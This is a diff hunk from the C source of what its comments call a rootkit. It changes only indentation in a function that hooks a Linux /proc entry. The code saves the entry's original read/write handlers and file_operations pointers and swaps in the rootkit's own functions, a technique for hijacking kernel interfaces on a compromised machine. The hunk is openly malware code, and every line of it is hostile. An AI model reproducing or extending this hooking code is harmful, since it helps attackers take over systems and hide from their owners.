@@ -169,36 +169,36 @@ static inline void proc_init(void) {
 
 	found:
 
-	/* Save the original pointers -- these will be 
-	 * restored when rootkit is unloaded */
-	old_write = ptr->write_proc;
-	old_read = ptr->read_proc;
+		/* Save the original pointers -- these will be 
+		 * restored when rootkit is unloaded */
+		old_write = ptr->write_proc;
+		old_read = ptr->read_proc;
 
-	fops = (struct file_operations *)ptr->proc_fops;	/* pointer to file_operations structure 
-														 * of infected entry */
-	old_fops_read = fops->read;
-	old_fops_write = fops->write;
+		fops = (struct file_operations *)ptr->proc_fops;	/* pointer to file_operations structure 
+															 * of infected entry */
+		old_fops_read = fops->read;
+		old_fops_write = fops->write;
 
-	/* Replace write_proc/read_proc */
-	if (ptr->write_proc) {
-		ptr->write_proc = buf_write;
-	} else if (ptr->read_proc) {
-		ptr->read_proc = buf_read;
-	}
+		/* Replace write_proc/read_proc */
+		if (ptr->write_proc) {
+			ptr->write_proc = buf_write;
+		} else if (ptr->read_proc) {
+			ptr->read_proc = buf_read;
+		}
 
-	/* Replace read/write from file_operations */
-	if (fops->write) {
-		fops->write = fops_write;
-	} else if (fops->read) {
-		fops->read = fops_read;
-	}
+		/* Replace read/write from file_operations */
+		if (fops->write) {
+			fops->write = fops_write;
+		} else if (fops->read) {
+			fops->read = fops_read;
+		}
 
-	/* Throw an error if there aren't any read/write functions */
-	if (!ptr->read_proc && !ptr->write_proc 
-		&& !fops->read && !fops->write) {
-		failed = 1;
-		return;
-	}
+		/* Throw an error if there aren't any read/write functions */
+		if (!ptr->read_proc && !ptr->write_proc 
+			&& !fops->read && !fops->write) {
+			failed = 1;
+			return;
+		}
 }	
 
 /* The following function does some cleanups.
